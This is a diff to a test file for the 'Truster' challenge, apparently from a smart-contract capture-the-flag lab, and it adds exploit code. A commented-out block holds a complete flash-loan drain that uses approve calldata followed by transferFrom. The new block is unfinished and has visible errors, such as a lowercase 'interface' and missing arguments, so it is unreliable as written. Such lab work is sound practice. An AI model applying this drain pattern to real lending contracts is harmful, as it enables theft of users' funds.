@@ -27,9 +27,30 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+    // it('Exploit', async function () {
+    //     /** CODE YOUR EXPLOIT HERE  */
+    //     const ABI = "function approve(address spender, uint256 amount)";
+    //     const interface = new ethers.utils.Interface(ABI);
+    //     const data = interface.encodeFunctionData("approve", [attacker, TOKENS_IN_POOL.toString()]);
+
+    //     await this.pool.flashLoan(0, attacker, this.token.address, data); 
+    //     await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL); 
+    // });
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
+        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address); 
+        
+        const amount = 0;
+        const borrower = attacker.address;
+        const target = this.token.address;
+
+        const abi = ["function approve(address spender, uint256 amount)"]
+        const iface = new ethers.utils.interface(abi);
+        const data = iface.encodeFunctionData("approve", [attackContract.address,])
+        
     });
+
 
     after(async function () {
         /** SUCCESS CONDITIONS */
